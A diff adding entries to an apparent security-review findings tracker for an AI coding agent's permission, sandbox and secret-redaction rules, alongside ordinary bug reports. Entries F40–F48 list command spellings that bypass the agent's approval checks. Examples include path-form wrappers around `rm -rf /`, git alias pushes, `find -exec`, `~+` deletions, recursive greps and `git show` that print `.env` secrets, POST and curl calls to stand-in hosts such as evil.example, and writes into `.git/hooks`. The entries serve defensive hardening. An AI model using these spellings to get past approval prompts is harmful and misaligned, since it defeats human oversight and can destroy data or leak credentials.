@@ -14,6 +14,58 @@ When fixed, move the entry to "Fixed" and add `- **Fixed:** #<PR>`.
 
 ## Open
 
+### F40 (M2-16 security review): a wrapper written as a path, or with flags the parser doesn't know, hides the inner command from every check
+- **Severity:** blocker (pre-existing) · `src/policy/rules/shell.ts:179` (`WRAPPERS.get(argv[0])` matches the text, not the program's basename), `:188-191`, `:122` (`env -S`), `src/policy/decide/decide.ts:193-204` and `targets.ts:39` (`find -exec` is never looked into)
+- Confirmed by `test/adversarial/guarantees.test.ts` (`test.failing`): with a tool-wide `Bash` allow rule `/usr/bin/env rm -rf /` and `/usr/bin/env cat .env` are allowed while `env rm -rf /` and `cat .env` ask; a deny rule `Bash(rm *)` lets `/bin/rm -rf x` through; `/usr/bin/env git push origin main` is allowed in tainted `bypassPermissions`. Reviewer's list of further spellings: `/usr/bin/timeout 9 git push`, `sudo -iu me git push`, `env -S 'git push origin main'`, `find . -maxdepth 0 -exec git push \;`; under sandbox auto-allow (headless never sets `State.sandboxAutoAllow`, so latent until it is wired) `/usr/bin/env rm -rf <cwd>`. Class: every check that recognises a command by `argv[0]` (strippedArgvs, shellVariants, criticalRemoval, shellTargets, oneRemote, selfControl) without reducing wrappers to their basename and parsing wrapper flags. Fix once at the unwrapping step and feed all checks from it.
+
+### F41 (M2-16 security review): an alias on the git command line hides `git push` from the remote-action check
+- **Severity:** major (pre-existing) · `src/policy/decide/remote.ts:22-30` (`gitArgs` reads the alias name as the subcommand)
+- Confirmed (`test.failing`): `git -c alias.p=push p origin main` is allowed in tainted `bypassPermissions`; the reviewer also saw it allowed under `Bash(git *)` and sandbox auto-allow where plain `git push` asks. Also allowed while tainted in bypass (minor, same list gap): `git send-pack origin main`, `gh release upload v1 secret.txt`, `wget --method=POST --body-data=x http://e.com`, `npx npm publish`.
+
+### F42 (M2-16 security review): other spellings of the home or working directory aren't critical, so bypass mode removes them without the countdown
+- **Severity:** major (pre-existing) · `src/policy/decide/critical.ts:61-72` (only `~`, `~/`, `$HOME`, `${HOME}` are expanded)
+- Confirmed (`test.failing`): in `bypassPermissions` `rm -rf ~marwan`, `rm -rf ~+` and `rm -rf "$PWD"` are allowed; `rm -rf ~` asks with the countdown. Treat `~user`, `~+`, `~-`, `$PWD`, `$OLDPWD` as critical spellings.
+
+### F43 (M2-16 security review): values from `.env` files are redacted only when the variable name looks secret (reviewer's reproduction; not rechecked)
+- **Severity:** major (pre-existing) · `src/policy/redaction/secrets.ts:60`, `src/cli/headless-run.ts:446` (scans only `projectRoot`, not additional working directories)
+- `.env` with `DB_PASS=hunter2hunter2xyz` and `STRIPE_SK=rk_live_51Habcdefghij`: `createDotEnvSecrets(...).current()` holds only `SESSION_SECRET`-like names, so `grep -r . .` (a read-only command, allowed unprompted) prints the others. Permissions §4.7 says the values of `.env*` files join the redaction set; apply the name filter only to the process environment.
+
+### F44 (M2-16 security review): an invisible character inside a secret stops its redaction
+- **Severity:** minor · `src/agent/loop.ts:370-372` (`stripHidden` runs before `redactText`), `src/policy/redaction/redact.ts:29` (folds only U+200B/C/D, U+FEFF)
+- `abcd1234\u2060efgh5678` for `MY_API_KEY=abcd1234efgh5678` reaches the model as two clear halves around the removal marker; same for U+00AD, U+034F, U+180E and tag characters. Redact before stripping, and share one character set with F14.
+
+### F45 (M2-16 security review): the "sandboxed command reached an untrusted host" taint misreads hosts
+- **Severity:** minor · `src/policy/sandbox/network.ts:149`
+- `curl https://registry.npmjs.org@evil.example/x` (user-info read as host), `curl HTTPS://evil.example/x` (case-sensitive scheme), `curl evil.example/x` and `wget -qO- evil.example` (no scheme) return no taint source. In bypass the proxy allows every host, so taint is the only brake.
+
+### F46 (M2-16 security review): the native-PDF branch of Read skips the output guard
+- **Severity:** minor · `src/tools/read-pdf.ts:78-98`, `src/agent/loop.ts:369`
+- A PDF whose text holds a token, read with `media.pdfs: true`, reaches the stored `document` part unredacted and without a taint effect; the text branch is redacted.
+
+### F47 (M2-16 security review): some read-only shell commands read sensitive files without the §4.7 ask
+- **Severity:** minor · `src/policy/shell-parse/read-only.ts:389` (`git show`), `:47`, `:551` (recursive `grep`/`rg`)
+- `git show HEAD:.env`, `git log -p`, `grep -r KEY .` and `rg --no-ignore --hidden KEY` are allowed in default mode; `cat .env` asks. `<rev>:<path>` operands and recursion into folders holding sensitive files aren't checked.
+
+### F48 (M2-16 security review): shell writes to protected paths by `tar`, `unzip`, `rsync`, `patch` and `perl -pi` aren't recognised
+- **Severity:** minor · `src/policy/decide/targets.ts:6-40`
+- With a tool-wide `Bash` allow: `tar -xf x.tar -C .git/hooks`, `unzip x.zip -d .git`, `rsync a.ts .git/hooks/pre-commit`, `patch .git/config p.diff`, `perl -pi -e s/a/b/ .git/config` are allowed; `cp`, `sed -i`, `dd of=`, `tee` and redirects ask. Bash has no equivalent of the PowerShell archive-extraction rule.
+
+### F36 (M2-16 spec review): a log whose last line is complete but has no final newline gets the next event glued onto it
+- **Severity:** major (pre-existing) · `src/store/event-log/reader.ts:128`, `src/store/event-log/writer.ts:127`
+- Reviewer's reproduction: write a session, close it, strip the final `\n`, reopen the writer, append a `user.message`: the next read says `line 1: the line is not valid JSON` and returns 0 events. The reader accepts a last line that parses but leaves `tornLine` unset, and the writer appends `\n` only when `tornLine` is set; a crash can cut a write just before its newline (F20 covered a half line). Have the reader report "no trailing newline" separately and the writer add `\n` (without the crash-repair marker) whenever the file doesn't end in one.
+
+### F37 (M2-16 spec review): a blob-mode restore writes through a parent directory that became a symlink
+- **Severity:** major (pre-existing) · `src/store/snapshots/checkpoints.ts:255-284`
+- With checkpoints disabled (blob mechanism): record a write of `w/sub/a.txt`, replace `w/sub` with a link to `../outside`, `restore("c1", "skip")` reports `written: 1` and `outside/a.txt` holds the old text. Checkpoints "Restore never writes through links" holds for the leaf (`lstat`) only; the git path checks every component through `pathBlock`. Run the same per-component check in the blob branch, for writes and deletes.
+
+### F38 (M2-16 spec review): a workspace opened through a symlink reports every Dovet-written file as a user conflict
+- **Severity:** major (pre-existing) · `src/store/snapshots/checkpoints.ts:179,187`
+- Git repo at `real/`, workspace opened as `via -> real` (macOS `/tmp` and `/var`, Windows `subst`): candidates are joined onto the git root's real path, while `file.change` events carry the workspace paths, so the `left` lookup never matches; `conflicts()` returns the file and "Skip these" restores nothing. Canonicalise both sides (or map git-root paths back to workspace paths) before comparing.
+
+### F39 (M2-16 spec review): the compaction facts' command output tail can start with a lone surrogate
+- **Severity:** minor (pre-existing) · `src/agent/compaction/facts.ts:68`
+- `r.output.trim().slice(-600)` on 400 emoji followed by `b` starts with U+DE00 (`isWellFormed()` false) and goes into the request sent to the provider. Use `tailOf(output, 600)` like the other cuts.
+
 ### F34 (M2-16 spec review): compaction requests never reach the daily ledger
 - **Severity:** major (pre-existing) · `src/cli/headless-run.ts:1141-1162` (`sendSummary`; `ledger.reserve/commit/release` are only on the main-request path, lines 1374, 1393, 1639)
 - A summary request (often the session's largest) calls `meter.record("compaction", …)` and adds to `guards.cost`, but writes no `reserve`/`commit` line: other sessions' day totals and this session's next daily check leave it out, so the hard daily cap (receipts-budgets "Behavior" 5, AC-RCPT-10 "counted toward budgets") is undercounted. Reserve before the call with the same estimate path as the main request and commit or release after; test: a day limit the summary would cross refuses it, and a second session sees its cost.
